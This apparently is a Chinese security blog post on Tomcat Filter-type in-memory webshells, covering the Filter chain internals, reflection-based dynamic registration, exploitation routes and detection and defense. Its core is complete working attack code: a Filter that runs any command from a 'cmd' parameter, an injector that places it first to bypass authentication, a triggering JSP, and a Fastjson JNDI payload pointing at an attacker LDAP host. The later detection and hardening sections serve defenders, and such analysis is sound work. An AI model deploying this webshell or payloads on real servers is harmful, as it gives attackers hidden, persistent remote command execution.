---
title: Tomcat Filter 内存马
date: 2025-12-27
categories: 
- 漏洞分析
tags: 
- tomcat
- filter
- 内存马
- Java安全
---

# Filter 内存马

内存马是指无文件落地、仅在内存中运行的 Webshell。与传统 JSP Webshell 不同，内存马不依赖磁盘文件，难以被常规文件扫描工具发现。Filter 型内存马利用 Tomcat 的 Filter 机制，在运行时动态注册恶意 Filter，拦截所有 HTTP 请求，是最常见的内存马类型。

---

## 一、Tomcat Filter 机制

### 1.1 Filter 执行流程

```
HTTP 请求
    ↓
StandardEngine → StandardHost → StandardContext
    ↓
StandardWrapperValve.invoke()
    ↓
ApplicationFilterChain.doFilter()
    ↓
Filter1 → Filter2 → ... → Servlet.service()
```

当一个 HTTP 请求到达 Tomcat 时，`ApplicationFilterChain` 负责按照 `FilterMap` 的顺序依次调用匹配的 Filter，最后到达 Servlet。

### 1.2 核心类关系

```
StandardContext
├── filterDefs: HashMap<String, FilterDef>     // Filter 定义
├── filterMaps: FilterMap[]                     // Filter-URL 映射（有序）
├── filterConfigs: HashMap<String, ApplicationFilterConfig>  // Filter 实例配置
└── pipeline (StandardPipeline)
    └── StandardContextValve → StandardWrapperValve
```

**三个关键数据结构**：

| 组件 | 作用 | 关键字段 |
|------|------|----------|
| `FilterDef` | 存储 Filter 的元信息 | `filterName`, `filterClass`, `filter`, `initParameters` |
| `FilterMap` | 定义 Filter 与 URL 的映射关系 | `filterName`, `urlPatterns`, `dispatcherTypes` |
| `ApplicationFilterConfig` | 持有 Filter 实例，管理生命周期 | `filterDef`, `filter` 实例 |

### 1.3 Filter 加载的源码分析

Tomcat 启动时通过 `ContextConfig.configureStart()` 解析 `web.xml` 和注解，调用的核心逻辑在 `StandardContext` 中：

```java
// StandardContext.filterStart() —— 初始化所有 Filter
public boolean filterStart() {
    for (FilterDef filterDef : filterDefs.values()) {
        ApplicationFilterConfig filterConfig = 
            new ApplicationFilterConfig(this, filterDef);
        filterConfigs.put(filterDef.getFilterName(), filterConfig);
    }
    return true;
}
```

```java
// ApplicationFilterChain.internalDoFilter() —— 请求过滤链
private void internalDoFilter(ServletRequest request, ServletResponse response) {
    if (pos < n) {
        ApplicationFilterConfig filterConfig = filters[pos++];
        Filter filter = filterConfig.getFilter();
        filter.doFilter(request, response, this);
        return;
    }
    // 全部 Filter 执行完毕，进入 Servlet
    servlet.service(request, response);
}
```

---

## 二、动态注册原理

**核心思路**：利用反射获取 `StandardContext` 对象，动态向其中添加 `FilterDef` 和 `FilterMap`。

### 2.1 获取 StandardContext

在 Tomcat 中，可以通过多种方式获取当前 `StandardContext` 对象：

```java
// 方式一：通过 request 获取（需要反射突破访问限制）
ServletRequest request = ...;
Field requestField = request.getClass().getDeclaredField("request");
requestField.setAccessible(true);
Request req = (Request) requestField.get(request);
StandardContext context = (StandardContext) req.getContext();
```

```java
// 方式二：通过 Thread 获取（JSP 场景）
Field contextField = Thread.currentThread().getContextClassLoader()
    .getClass().getSuperclass().getDeclaredField("resources");
// ... 逐步反射获取 StandardContext
```

```java
// 方式三：通过 MBean（JMX）
MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
ObjectName name = new ObjectName("Catalina:type=Server");
// 遍历获取 StandardContext
```

### 2.2 动态注册步骤

```
1. 编写恶意 Filter 类（实现 Filter 接口）
2. 获取 StandardContext 对象
3. 创建 FilterDef 并设置 filterName / filterClass / filter
4. 将 FilterDef 添加到 context.filterDefs
5. 创建 FilterMap 并设置 URL 映射
6. 将 FilterMap 插入到 context.filterMaps 数组首位
7. 创建 ApplicationFilterConfig 并添加到 context.filterConfigs
```

---

## 三、完整代码实现

### 3.1 恶意 Filter 类

```java
import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class FilterMemShell implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                         FilterChain chain) throws IOException, ServletException {
        // 从请求中获取命令参数
        String cmd = request.getParameter("cmd");
        if (cmd != null && !cmd.isEmpty()) {
            try {
                // 执行系统命令（兼容 Windows / Linux）
                boolean isWindows = System.getProperty("os.name")
                    .toLowerCase().contains("windows");
                String[] fullCmd = isWindows 
                    ? new String[]{"cmd.exe", "/c", cmd}
                    : new String[]{"/bin/sh", "-c", cmd};

                Process process = Runtime.getRuntime().exec(fullCmd);
                InputStream inputStream = process.getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
                String result = scanner.hasNext() ? scanner.next() : "";
                
                // 回显命令执行结果
                response.getWriter().write("<pre>" + result + "</pre>");
                scanner.close();
                return; // 不继续调用 chain，直接返回
            } catch (Exception e) {
                response.getWriter().write("Error: " + e.getMessage());
            }
        }
        // 正常请求放行
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {
    }
}
```

### 3.2 注入器代码

```java
import org.apache.catalina.Context;
import org.apache.catalina.core.*;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import javax.servlet.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;

public class FilterMemShellInjector {

    /**
     * 注入 Filter 内存马
     * @param request HttpServletRequest 对象
     */
    public static void inject(ServletRequest request) throws Exception {
        // Step 1: 获取 StandardContext
        StandardContext context = getStandardContext(request);

        // Step 2: 检查是否已注入（避免重复）
        String filterName = "FilterMemShell";
        if (context.findFilterDef(filterName) != null) {
            System.out.println("[!] Filter already injected: " + filterName);
            return;
        }

        // Step 3: 创建 FilterDef
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(filterName);
        filterDef.setFilterClass(FilterMemShell.class.getName());
        filterDef.setFilter(new FilterMemShell());

        // Step 4: 添加 FilterDef 到 context
        context.addFilterDef(filterDef);

        // Step 5: 创建 FilterMap（映射到所有 URL）
        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName(filterName);
        filterMap.addURLPattern("/*");
        filterMap.setDispatcher("REQUEST");

        // Step 6: 将 FilterMap 插入到首位（确保优先执行）
        context.addFilterMap(filterMap);

        // Step 7: 反射获取并操作 filterConfigs
        Field configsField = StandardContext.class.getDeclaredField("filterConfigs");
        configsField.setAccessible(true);
        Map<String, ApplicationFilterConfig> filterConfigs = 
            (Map<String, ApplicationFilterConfig>) configsField.get(context);

        // 手动创建 ApplicationFilterConfig（绕过生命周期检查）
        Constructor<ApplicationFilterConfig> constructor = 
            ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = 
            constructor.newInstance(context, filterDef);
        filterConfigs.put(filterName, filterConfig);
    }

    /**
     * 从 request 中获取 StandardContext
     */
    private static StandardContext getStandardContext(ServletRequest servletRequest) 
            throws Exception {
        // 反射获取内部的 Request 对象
        Field requestField = servletRequest.getClass().getDeclaredField("request");
        requestField.setAccessible(true);
        Request request = (Request) requestField.get(servletRequest);
        return (StandardContext) request.getContext();
    }
}
```

### 3.3 触发注入的 JSP

```jsp
<%@ page import="java.lang.reflect.*, org.apache.catalina.core.*, 
    org.apache.tomcat.util.descriptor.web.*, javax.servlet.*" %>
<%
    try {
        FilterMemShellInjector.inject(request);
        out.println("Filter memory shell injected successfully!");
        out.println("Access: ?cmd=whoami");
    } catch (Exception e) {
        out.println("Injection failed: " + e.getMessage());
        e.printStackTrace();
    }
%>
```

---

## 四、代码详解

### 4.1 为什么要插入 FilterMap 首位？

`ApplicationFilterChain` 是按照 `filterMaps` 数组的顺序依次调用 Filter 的。将恶意 Filter 插入到首位可以保证它在其他 Filter（如鉴权 Filter）之前执行，从而：
- 绕过认证拦截，直接执行命令
- 即使后续 Filter 抛出异常，恶意逻辑已经执行完毕

```java
// ApplicationFilterChain 中的匹配逻辑
for (FilterMap filterMap : filterMaps) {
    if (matchFiltersURL(filterMap, requestPath)) {
        ApplicationFilterConfig filterConfig = filterConfigs.get(filterMap.getFilterName());
        if (filterConfig != null) {
            filters.add(filterConfig);
        }
    }
}
```

### 4.2 反射创建 ApplicationFilterConfig 的必要性

正常情况下，`ApplicationFilterConfig` 是由 Tomcat 在启动阶段通过 `StandardContext.filterStart()` 方法统一创建的。运行时直接向 `filterDefs` 添加 `FilterDef` 并不会自动创建 `ApplicationFilterConfig`，因此需要手动通过反射调用构造函数来完成实例化。

### 4.3 防止重复注入

```java
if (context.findFilterDef(filterName) != null) {
    return; // 已存在，跳过
}
```

每次请求都注入会导致内存中产生多个同名 Filter，既不规范也容易被发现。

---

## 五、利用场景

### 5.1 Shiro 反序列化 → 注入内存马

Shiro rememberMe 反序列化获取代码执行能力后，注入 Filter 内存马实现持久化：

```java
// 反序列化 payload 中的代码片段
Field reqF = request.getClass().getDeclaredField("request");
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
StandardContext context = (StandardContext) req.getContext();
// ... 注册 Filter
```

利用流程：
```
Shiro rememberMe Cookie → AES 解密 → 反序列化 → 代码执行
    → 反射获取 StandardContext → 注入 Filter 内存马
    → 访问 /?cmd=whoami → 命令回显
```

### 5.2 Fastjson 反序列化 → JNDI 注入

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/EvilClass",
  "autoCommit": true
}
```

`EvilClass` 的静态代码块中执行 Filter 注入逻辑。

### 5.3 文件上传 → 注入后删除

```
1. 上传 JSP 注入脚本到 web 目录
2. 访问 JSP 触发注入
3. JSP 执行完毕后自我删除（new File(application.getRealPath("/shell.jsp")).delete()）
4. 内存马持久化运行，磁盘无残留
```

### 5.4 Spring Boot Actuator 环境修改

通过 `/actuator/env` 端点修改 logging 配置，注入恶意 XML 触发代码执行后注册内存马。

---

## 六、检测方式

### 6.1 JMX 检查

```bash
# 连接本地 JMX
jconsole

# 或使用 jcmd 列出 MBean
jcmd <pid> ManagementAgent.start_local
```

通过 JMX 查看 `Catalina:type=Context` 下的 `filterDefs` 和 `filterMaps` 属性。

### 6.2 Arthas 在线查杀

```bash
# 启动 Arthas
java -jar arthas-boot.jar

# 查看所有的 Filter
vmtool --action getInstances --className org.apache.tomcat.util.descriptor.web.FilterDef --limit 50

# 查看 StandardContext 中的 filterDefs
ognl '@org.apache.catalina.core.StandardContext@filterDefs'

# 使用 sc 搜索可疑 Filter
sc *.Filter*
```

### 6.3 JVM 内存分析

```bash
# dump 内存
jmap -dump:format=b,file=heapdump.hprof <pid>

# 使用 MAT / VisualVM 分析
# 搜索 FilterDef / ApplicationFilterConfig 对象
```

### 6.4 Java Agent 检测脚本

```java
// 通过 agent 监控 Context 的 filterDefs 变化
public class FilterMonitor implements ClassFileTransformer {
    @Override
    public byte[] transform(...) {
        // 监控 Context.addFilterDef() 和 Context.addFilterMap() 方法
        // 记录非启动阶段的调用
    }
}
```

---

## 七、防御建议

### 7.1 运行时防御

| 层面 | 措施 | 说明 |
|------|------|------|
| **JVM 层** | 部署 RASP | 监控反射调用 `addFilterDef` / `addFilterMap` |
| **容器层** | Security Manager | 限制反射访问 `StandardContext` 内部字段 |
| **系统层** | WAF | 检测请求参数中的命令注入特征 |

### 7.2 周期性巡检

```bash
# 1. 导出当前 Filter 列表
curl -s http://localhost:8080/manager/html/list  # 需要 manager 权限

# 2. 对比基线
diff baseline_filters.txt current_filters.txt

# 3. 检查可疑特征
grep -E "cmd|exec|Runtime|ProcessBuilder" WEB-INF/lib/*
```

### 7.3 开发规范

```java
// 反序列化白名单
public class SafeObjectInputStream extends ObjectInputStream {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) {
        if (!isAllowed(desc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization");
        }
        return super.resolveClass(desc);
    }
}
```

---

## 八、总结

Filter 内存马的核心在于理解 Tomcat 的 Filter 加载机制：

1. **知道目标**：`StandardContext` 中的 `filterDefs`、`filterMaps`、`filterConfigs`
2. **获取入口**：通过反射链获取 `StandardContext` 对象
3. **动态注册**：构造并插入 `FilterDef` + `FilterMap`
4. **触发执行**：恶意 Filter 拦截所有匹配的请求，实现持续控制

Filter 内存马的隐蔽性极高，传统的文件扫描、日志审计难以发现。防御的关键在于：
- **事前**：修复反序列化等 RCE 漏洞，切断注入入口
- **事中**：部署 RASP 进行运行时行为监控
- **事后**：周期性 JVM 内存取证，对比 Filter 基线

> **延伸阅读**：[Tomcat Servlet 内存马](/2025/12/27/tomcat-servlet-memory-shell/) | [Tomcat Listener 内存马](/2025/12/27/tomcat-listener-memory-shell/) | [Tomcat基础](/2025/12/30/tomcat-basics/)
